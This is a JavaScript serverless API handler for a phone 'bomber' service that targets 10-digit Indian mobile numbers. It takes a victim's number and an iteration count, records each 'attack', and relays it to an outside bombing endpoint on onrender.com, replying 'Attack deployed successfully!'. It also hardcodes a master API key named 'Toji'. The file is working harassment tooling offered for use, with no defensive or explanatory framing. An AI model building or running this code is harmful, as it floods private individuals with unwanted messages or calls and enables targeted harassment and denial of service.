import axios from 'axios';
import { validateApiKey } from '../../lib/auth.js';
import { getClientIp } from '../../lib/ip.js';

// In-memory storage for keys (persists between function calls in Vercel's global scope)
global.apiKeys = global.apiKeys || new Map();
global.attackLogs = global.attackLogs || [];

// Initialize main key
if (!global.apiKeys.has('Toji')) {
    global.apiKeys.set('Toji', {
        key: 'Toji',
        owner: 'System Admin',
        requests: 0,
        limit: 10000,
        createdAt: Date.now(),
        isActive: true,
        isMaster: true
    });
}

export default async function handler(req, res) {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false, 
            error: 'Method not allowed. Use POST.' 
        });
    }

    // Validate API key
    const authResult = validateApiKey(req.headers);
    if (!authResult.valid) {
        return res.status(401).json({ 
            success: false, 
            error: authResult.error 
        });
    }

    const apiKey = authResult.key;
    
    // Update request count
    const keyData = global.apiKeys.get(apiKey);
    keyData.requests++;
    keyData.lastUsed = Date.now();

    try {
        const { phone, iterations = 1 } = req.body;

        // Input validation
        if (!phone) {
            return res.status(400).json({
                success: false,
                error: "Phone number is required"
            });
        }

        // Clean and validate phone number
        const cleanedPhone = phone.toString().replace(/\D/g, '');
        if (cleanedPhone.length !== 10 || !/^[6-9]/.test(cleanedPhone)) {
            return res.status(400).json({
                success: false,
                error: "Invalid phone number. Must be 10-digit Indian number."
            });
        }

        // Validate iterations
        const iterNum = Math.min(Math.max(parseInt(iterations) || 1, 1), 10);
        
        // Get client IP automatically
        const clientIp = getClientIp(req);
        
        // Generate request ID
        const requestId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
        
        // Log the attack
        const attackLog = {
            requestId,
            phone: cleanedPhone,
            ip: clientIp,
            iterations: iterNum,
            apiKey: apiKey,
            timestamp: new Date().toISOString(),
            status: 'initiated'
        };
        
        global.attackLogs.unshift(attackLog);
        
        // Keep only last 1000 logs for memory management
        if (global.attackLogs.length > 1000) {
            global.attackLogs.length = 1000;
        }
        
        // Process attack asynchronously (don't wait for response)
        processAttackAsync(attackLog);
        
        // Immediate success response
        return res.status(200).json({
            success: true,
            message: "Attack deployed successfully!",
            data: {
                requestId,
                target: cleanedPhone,
                iterations: iterNum,
                status: "processing",
                estimatedTime: "1-3 minutes",
                timestamp: attackLog.timestamp
            },
            usage: {
                requests: keyData.requests,
                remaining: keyData.limit - keyData.requests
            }
        });

    } catch (error) {
        console.error("Attack error:", error);
        return res.status(500).json({
            success: false,
            error: "Failed to deploy attack. Please try again."
        });
    }
}

// Async attack processing (fire and forget)
async function processAttackAsync(attackLog) {
    try {
        // Call the actual bombing API
        const response = await axios.post(
            'https://aivoratechbomber-2077.onrender.com/api/bomb',
            {
                phone: attackLog.phone,
                ip: attackLog.ip,
                iterations: attackLog.iterations
            },
            {
                timeout: 25000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Content-Type': 'application/json'
                }
            }
        );

        // Update attack log
        attackLog.status = 'completed';
        attackLog.completedAt = new Date().toISOString();
        attackLog.response = response.data;
        
        console.log(`✅ Attack completed: ${attackLog.phone} | Request: ${attackLog.requestId}`);

    } catch (error) {
        attackLog.status = 'failed';
        attackLog.error = error.message;
        attackLog.failedAt = new Date().toISOString();
        
        console.error(`❌ Attack failed: ${attackLog.phone}`, error.message);
    }
}
